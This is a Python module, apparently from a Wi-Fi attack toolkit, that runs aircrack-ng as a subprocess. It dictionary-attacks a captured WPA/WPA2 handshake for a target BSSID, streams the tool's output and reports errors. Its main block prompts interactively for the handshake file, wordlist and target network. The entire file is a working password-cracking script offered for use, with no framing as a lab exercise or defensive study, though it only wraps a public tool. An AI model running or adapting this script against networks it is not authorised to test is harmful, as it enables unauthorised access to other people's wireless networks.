# modules/crack.py

import subprocess

def crack_password(handshake_file, wordlist_file, bssid):
    """
    Attempts to crack the WPA/WPA2 password using a handshake capture file,
    a wordlist, and the BSSID of the target network.

    Args:
        handshake_file (str): Path to the .cap file containing the handshake.
        wordlist_file (str): Path to the wordlist file.
        bssid (str): BSSID of the target Wi-Fi network.
    """
    print("[*] Starting password cracking...")
    command = [
        "aircrack-ng",
        "-w",
        wordlist_file,
        "-b",
        bssid,
        handshake_file
    ]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(f"[*] {output.strip()}")
        return_code = process.wait()
        if return_code == 0:
            print("[+] Password cracking finished.")
        else:
            print(f"[-] Password cracking failed or no password found in the wordlist (return code: {return_code}).")
            error_output = process.stderr.read()
            if error_output:
                print(f"[-] Error output from aircrack-ng:\n{error_output}")

    except FileNotFoundError:
        print("[!] Error: aircrack-ng not found. Please ensure it is installed and in your system's PATH.")
    except Exception as e:
        print(f"[!] An unexpected error occurred during password cracking: {e}")

if __name__ == "__main__":
    # Example usage (for testing the module directly)
    handshake = input("Enter the path to the handshake file (.cap): ")
    wordlist = input("Enter the path to the wordlist file: ")
    target_bssid = input("Enter the BSSID of the target network: ")
    crack_password(handshake, wordlist, target_bssid)
